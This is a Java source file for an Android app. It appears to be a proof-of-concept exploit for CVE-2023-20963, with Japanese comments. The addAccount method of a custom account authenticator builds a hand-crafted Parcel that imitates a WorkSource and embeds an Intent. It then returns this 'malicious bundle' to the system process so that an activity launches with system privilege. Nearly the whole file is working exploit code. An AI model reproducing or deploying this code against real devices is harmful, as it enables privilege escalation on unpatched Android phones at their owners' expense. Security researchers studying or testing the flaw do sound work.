package com.example.tzpoc;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.NetworkErrorException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MyAuthenticator extends AbstractAccountAuthenticator {
    private static final String TAG = "BadParcel";

    public MyAuthenticator(Context context) {
        super(context);
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
                             String authTokenType, String[] requiredFeatures, Bundle options)
            throws NetworkErrorException {

        MainActivity.appendLog("[*] addAccount called. Building malicious parcel...");

        // ----- より正確なペイロード構築（CVE-2023-20963）-----
        // 参考: https://github.com/retr0reg/CVE-2023-20963-PoC

        Intent exploitIntent = new Intent();
        exploitIntent.setComponent(new ComponentName(
                "com.example.tzpoc",
                "com.example.tzpoc.ProofActivity"
        ));
        exploitIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        exploitIntent.setPackage("com.example.tzpoc"); // 明示的にパッケージを指定

        Parcel intentParcel = Parcel.obtain();
        exploitIntent.writeToParcel(intentParcel, 0);

        // データParcelの構築（WorkSourceを模倣）
        Parcel dataParcel = Parcel.obtain();
        Parcel finalParcel = Parcel.obtain();

        // WorkSource のヘッダー（タイプ: 13）
        dataParcel.writeInt(3);          // バージョン
        dataParcel.writeInt(13);         // WorkSource type token
        dataParcel.writeInt(2);          // flags
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(6);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(4);
        dataParcel.writeString("android.os.WorkSource");
        dataParcel.writeInt(-1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(13);
        dataParcel.writeInt(13);
        dataParcel.writeInt(68);
        dataParcel.writeInt(11);
        dataParcel.writeInt(0);
        dataParcel.writeInt(7);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(1);
        dataParcel.writeInt(1);
        dataParcel.writeInt(13);
        dataParcel.writeInt(22);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(13);
        dataParcel.writeInt(-1);

        // Intent データの埋め込み
        int intentStartPos = dataParcel.dataPosition();
        dataParcel.writeString("intent");
        dataParcel.writeInt(4);          // PARCELABLE
        dataParcel.writeString("android.content.Intent");
        dataParcel.appendFrom(intentParcel, 0, intentParcel.dataSize());

        // 長さを修正
        int intentEndPos = dataParcel.dataPosition();
        dataParcel.setDataPosition(intentStartPos - 4);
        dataParcel.writeInt(intentEndPos - intentStartPos);
        dataParcel.setDataPosition(intentEndPos);

        // Bundle 用のラッパー
        int totalSize = dataParcel.dataSize();
        MainActivity.appendLog("[+] Malicious parcel size: 0x" + Integer.toHexString(totalSize));

        finalParcel.writeInt(totalSize);
        finalParcel.writeInt(0x4c444e42); // "BDNL" (Bundle magic)
        finalParcel.appendFrom(dataParcel, 0, totalSize);
        finalParcel.setDataPosition(0);

        // Bundle に変換
        Bundle result = new Bundle();
        try {
            result.readFromParcel(finalParcel);
            MainActivity.appendLog("[+] Malicious bundle created successfully.");
        } catch (Exception e) {
            MainActivity.appendLog("[-] Failed to read malicious parcel: " + e.getMessage());
        }

        // リソース解放
        intentParcel.recycle();
        dataParcel.recycle();
        finalParcel.recycle();

        MainActivity.appendLog("[*] Returning malicious bundle to system process.");
        return result;
    }

    // その他のオーバーライド（空実装）
    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) {
        return null;
    }
}
